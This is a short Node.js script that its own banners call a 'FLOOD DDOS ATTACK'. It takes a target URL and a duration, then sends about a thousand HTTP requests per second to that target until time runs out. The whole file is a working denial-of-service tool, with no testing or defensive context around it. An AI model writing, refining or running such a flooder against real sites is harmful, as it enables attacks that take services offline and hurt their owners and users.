const target = process.argv[2];
const duration = parseInt(process.argv[3]);

if (!target || isNaN(duration)) {
    console.error('╭═════════════════════════════════╮');
    console.error(' Invalid Usage: node h.js url and duration');
    console.error('╰═════════════════════════════════╯');
    process.exit(1);
}

console.log(`╭═════════════════════════════════╮`);
console.log(`       FLOOD DDOS ATTACK INITIATED    `);
console.log(`  ☣️ Target: ${target}              `);
console.log(`  🕣 Duration: ${duration}s         `);
console.log(`╰═════════════════════════════════╯`);

const attackInterval = setInterval(() => {
    for (let i = 0; i < 100; i++) {
        fetch(target)
            .then(() => console.log(`Request sent to ${target}`))
            .catch(() => console.error(`Failed to send request to ${target}`));
    }
}, 100);

setTimeout(() => {
    clearInterval(attackInterval);
    console.log('╭═════════════════════════════════╮');
    console.log('       FLOOD DDOS ATTACK ENDED     ');
    console.log('╰═════════════════════════════════╯');
    process.exit(0);
}, duration * 1000);
